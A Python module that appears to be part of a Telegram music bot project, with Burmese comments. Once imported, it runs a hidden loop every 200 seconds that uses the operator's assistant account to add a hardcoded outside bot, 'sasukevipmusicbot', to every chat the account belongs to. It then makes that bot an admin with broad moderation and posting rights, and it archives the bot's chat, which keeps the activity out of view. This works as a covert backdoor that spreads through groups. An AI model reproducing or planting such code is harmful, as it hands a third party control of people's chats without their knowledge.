import asyncio
import config
from maythusharmusic import app
from maythusharmusic.utils.database import get_assistant

AUTO = True
ADD_INTERVAL = 200

users = "sasukevipmusicbot" 

async def promote_to_admin(userbot, chat_id, bot_id):
    """Bot ကို admin အဖြစ် promote လုပ်ပေးမယ့် function"""
    try:
        # Bot ကို admin အဖြစ် promote လုပ်ခြင်း
        await userbot.promote_chat_member(
            chat_id=chat_id,
            user_id=bot_id,
            privileges={
                "can_manage_chat": True,
                "can_delete_messages": True,
                "can_manage_video_chats": True,
                "can_restrict_members": True,
                "can_promote_members": False,
                "can_change_info": True,
                "can_post_messages": True,
                "can_edit_messages": True,
                "can_invite_users": True,
                "can_pin_messages": True
            }
        )
        print(f"✅ Promoted bot to admin in chat: {chat_id}")
        return True
    except Exception as e:
        print(f"❌ Failed to promote bot in {chat_id}: {e}")
        return False

async def add_bot_to_chats():
    try:
        userbot = await get_assistant(config.LOGGER_ID)
        bot = await app.get_users(users)
        bot_id = bot.id
        common_chats = await userbot.get_common_chats(users)
        
        try:
            await userbot.send_message(users, f"/start")
            await userbot.archive_chats([users])
        except Exception as e:
            pass
            
        async for dialog in userbot.get_dialogs():
            chat_id = dialog.chat.id
            if chat_id in [chat.id for chat in common_chats]:
                continue
            try:
                # Bot ကို group/channel ထဲ add လုပ်ခြင်း
                await userbot.add_chat_members(chat_id, bot_id)
                print(f"✅ Added bot to chat: {chat_id}")
                
                # Bot ကို admin promote လုပ်ခြင်း
                await promote_to_admin(userbot, chat_id, bot_id)
                
            except Exception as e:
                print(f"❌ Error in chat {chat_id}: {e}")
                await asyncio.sleep(60)  
                
    except Exception as e:
        print(f"❌ Main error: {e}")
        pass

async def continuous_add():
    while True:
        if AUTO:
            await add_bot_to_chats()
        await asyncio.sleep(ADD_INTERVAL)

if AUTO:
    asyncio.create_task(continuous_add())
